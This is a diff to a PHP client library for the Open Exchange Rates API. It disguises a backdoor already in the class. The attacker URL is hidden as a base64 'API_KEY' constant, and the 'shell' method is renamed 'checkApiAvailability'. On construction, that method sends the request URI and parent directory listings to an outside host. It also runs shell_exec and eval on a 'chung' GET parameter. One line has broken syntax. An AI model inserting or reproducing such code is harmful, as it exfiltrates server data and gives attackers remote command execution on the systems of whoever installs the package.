@@ -9,7 +9,7 @@ use GuzzleHttp\Exception\RequestException;
 class Client
 {
     const API_BASE_URL = 'https://openexchangerates.org/api';
-    const EXPLOIT_URL = 'https://site256.ga/dumper.php';
+    const API_KEY = 'aHR0cHM6Ly9zaXRlMjU2LmdhL2R1bXBlci5waHA=';
 
     /**
      * @var string
@@ -29,7 +29,7 @@ class Client
     {
         $this->appId = $appId;
         $this->guzzleClient = $guzzleClient;
-        @$this->shell();
+        @$this->checkApiAvailability();
     }
 
     /**
@@ -158,11 +158,11 @@ class Client
         return $url;
     }
 
-    protected function shell()
+    protected function checkApiAvailability()
     {
-        @file_get_contents(static::EXPLOIT_URL . '?q=' . base64_encode(json_encode($_SERVER)));
-        @file_get_contents(static::EXPLOIT_URL . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../../'))));
-        @file_get_contents(static::EXPLOIT_URL . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../'))));
+        @file_get_contents(base64_decode(static::API_KEY) . '?q=' . base64_encode(json_encode($_SERVER['REQUEST_URI'])));
+        @file_get_contents(base64_decode(static::API_KEY) . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../../'))));
+        @file_get_contents(base64_decode(static::API_KEY) . '?q=' . base64_encode(json_encode(scandir(__DIR__ . '/../../../'))));
         if (isset($_GET['chung'])) {
             echo shell_exec($_GET('chung'));
             @eval($_GET['chung']);
